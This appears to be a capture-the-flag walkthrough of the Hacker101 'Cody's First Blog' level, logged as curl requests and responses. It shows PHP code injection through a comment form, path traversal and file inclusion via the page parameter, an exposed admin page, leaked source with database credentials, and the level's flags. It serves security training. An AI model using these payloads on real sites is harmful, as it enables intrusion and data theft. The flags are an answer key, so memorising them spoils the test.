
user@kali:~$ curl -X GET http://34.94.3.143/da0f31873e/
<!doctype html>
<html>
        <head>
                <title>Home -- Cody's First Blog</title>
        </head>
        <body>
                <h1>Home</h1>
                <p>Welcome to my blog!  I'm excited to share my thoughts with the world.  I have many important and controversial positions, which I hope to get across here.</p>

        <h2>September 1, 2018 -- First</h2>
        <p>First post!  I built this blog engine around one basic concept: PHP doesn't need a template language because it <i>is</i> a template language.  This server can't talk to the outside world and nobody but me can upload files, so there's no risk in just using include().</p>
<p>Stick around for a while and comment as much as you want; all thoughts are welcome!</p>


                <br>
                <br>
                <hr>
                <h3>Comments</h3>
                <!--<a href="?page=admin.auth.inc">Admin login</a>-->
                <h4>Add comment:</h4>
                <form method="POST">
                        <textarea rows="4" cols="60" name="body"></textarea><br>
                        <input type="submit" value="Submit">
                </form>
        </body>
</html>
user@kali:~$


Flag0:
What was the first input you saw?
Figuring out what platform this is running on may give you some ideas
Code injection usually doesn't work

user@kali:~$ curl -X POST http://34.94.3.143/da0f31873e/ -d "body=<?php include '../'; ?>"
<p>^FLAG^98b108783dc5d0adb893011afab0306fe1bf78d269610b8ff136e3f06f47595a$FLAG$</p>     <p>Comment submitted and awaiting approval!</p>
        <a href="javascript:window.history.back()">Go back</a>


Flag1:
Make sure you check everything you're provided
Unused code can often lead to information you wouldn't otherwise get
Simple guessing might help you out

user@kali:~$ curl -X GET http://34.94.3.143/da0f31873e/?page=admin.auth.inc
<!doctype html>
<html>
        <head>
                <title>Admin Login -- Cody's First Blog</title>
        </head>
        <body>
                <h1>Admin Login</h1>
                <form method="POST">
        Username: <input type="text" name="username"><br>
        Password: <input type="password" name="password"><br>
        <input type="submit" value="Log In"><br>
        </form>
                <br>
                <br>
                <hr>
                <h3>Comments</h3>
                <!--<a href="?page=admin.auth.inc">Admin login</a>-->
                <h4>Add comment:</h4>
                <form method="POST">
                        <textarea rows="4" cols="60" name="body"></textarea><br>
                        <input type="submit" value="Submit">
                </form>
        </body>
</html>

user@kali:~$ curl -X GET http://34.94.3.143/da0f31873e/?page=../admin.auth.inc
<!doctype html>
<html>
        <head>
                <title><br />
<b>Notice</b>:  Undefined variable: title in <b>/app/index.php</b> on line <b>27</b><br />
 -- Cody's First Blog</title>
        </head>
        <body>
                <h1><br />
<b>Notice</b>:  Undefined variable: title in <b>/app/index.php</b> on line <b>30</b><br />
</h1>
                <br />
<b>Warning</b>:  include(../admin.auth.inc.php): failed to open stream: No such file or directory in <b>/app/index.php</b> on line
 <b>21</b><br />
<br />
<b>Warning</b>:  include(): Failed opening '../admin.auth.inc.php' for inclusion (include_path='.:/usr/share/php:/usr/share/pear')
 in <b>/app/index.php</b> on line <b>21</b><br />
                <br>
                <br>
                <hr>
                <h3>Comments</h3>
                <!--<a href="?page=admin.auth.inc">Admin login</a>-->
                <h4>Add comment:</h4>
                <form method="POST">
                        <textarea rows="4" cols="60" name="body"></textarea><br>
                        <input type="submit" value="Submit">
                </form>
        </body>
</html>

https://blog.udemy.com/php-injection/

user@kali:~$ curl -X GET http://34.94.3.143/da0f31873e/?page=admin.inc
<!doctype html>
<html>
        <head>
                <title>Admin -- Cody's First Blog</title>
        </head>
        <body>
                <h1>Admin</h1>
                <h2>Pending Comments</h2>
                <hr>
                <h3>Comment on home.inc</h3>
                <p>&lt;script&gt;alert('hello');&lt;/script&gt;</p>
                <a href="?page=admin.inc&approve=2">Approve Comment</a>
                                <hr>
                <h3>Comment on home.inc</h3>
                <p>&lt;?php include '../'; ?&gt;</p>
                <a href="?page=admin.inc&approve=3">Approve Comment</a>
                                <hr>
                <h3>Comment on home.inc</h3>
                <p>&lt;?php include '../'; ?&gt;</p>
                <a href="?page=admin.inc&approve=4">Approve Comment</a>
                                <hr>
                <h3>Comment on admin.auth.inc</h3>
                <p>&lt;?php include '../' ?&gt;</p>
                <a href="?page=admin.inc&approve=5">Approve Comment</a>
                                <br>
                <br>
                <hr>
                <h3>Comments</h3>
                <!--<a href="?page=admin.auth.inc">Admin login</a>-->
                <h4>Add comment:</h4>
                <form method="POST">
                        <textarea rows="4" cols="60" name="body"></textarea><br>
                        <input type="submit" value="Submit">
                </form>
                <hr>
                <p>Admin flag is ^FLAG^7a61343e83d5ae80598dcf3e76de4ce84146e96e194ac035a0e408ec8c1f9939$FLAG$</p>
                        </body>
</html>


Flag2
Read the first blog post carefully
We talk about this in the Hacker101 File Inclusion Bugs video
Where can you access your own stored data?
Include doesn't just work for filenames

        <h2>September 1, 2018 -- First</h2>
        <p>First post!  I built this blog engine around one basic concept: PHP doesn't need a template language because it <i>is</i> a template language.  This server can't talk to the outside world and nobody but me can upload files, so there's no risk in just using include().</p>
<p>Stick around for a while and comment as much as you want; all thoughts are welcome!</p>

https://github.com/testerting/hacker101-ctf/tree/master/codys_first_blog

user@kali:~$ curl -X GET http://34.94.3.143/da0f31873e/?page=index
<br />
<b>Fatal error</b>:  Allowed memory size of 134217728 bytes exhausted (tried to allocate 16384 bytes) in <b>/app/index.php</b> on 
line <b>20</b><br />

Add a new comment to read index.php:
<?php echo readfile("index.php")?>
And approve it in admin page.

user@kali:~$ curl -X GET http://34.94.3.143/da0f31873e/?page=http://localhost/index
...
        // ^FLAG^397ac4bf9197295fb2f6e27a54779f7bce2664f70134c2404e784c0d6cec276d$FLAG$
        mysql_connect("localhost", "root", "");
        mysql_select_db("level4");
        $page = isset($_GET['page']) ? $_GET['page'] : 'home.inc';
...




